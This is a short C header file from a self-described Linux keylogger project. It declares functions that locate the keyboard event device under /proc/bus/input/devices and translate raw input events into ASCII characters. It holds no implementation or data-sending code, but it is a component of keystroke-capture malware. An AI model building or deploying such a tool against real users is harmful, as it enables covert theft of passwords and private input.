/*
    Only support keyboard reader because this is keylogger :)
    Main idea is from https://www.codyhiar.com/blog/linux-keylogger-how-to-read-linux-keyboard-buffer/
*/
#ifndef DEVICE_READER_H
#define DEVICE_READER_H

#include <stdint.h>

#include "input-event-codes.h"

/*
    Get the keyboard event file name from /proc/bus/input/devices
    Returns result to buf of size size
*/
void get_keyboard_event(char *buf, size_t size);


struct input_event {
    uint64_t __sec;
    uint64_t __usec;

    uint16_t type;
    uint16_t code;
    uint32_t value;
};

char input_event_to_ascii(struct input_event ie);
void debug_input_event(struct input_event ie);

#endif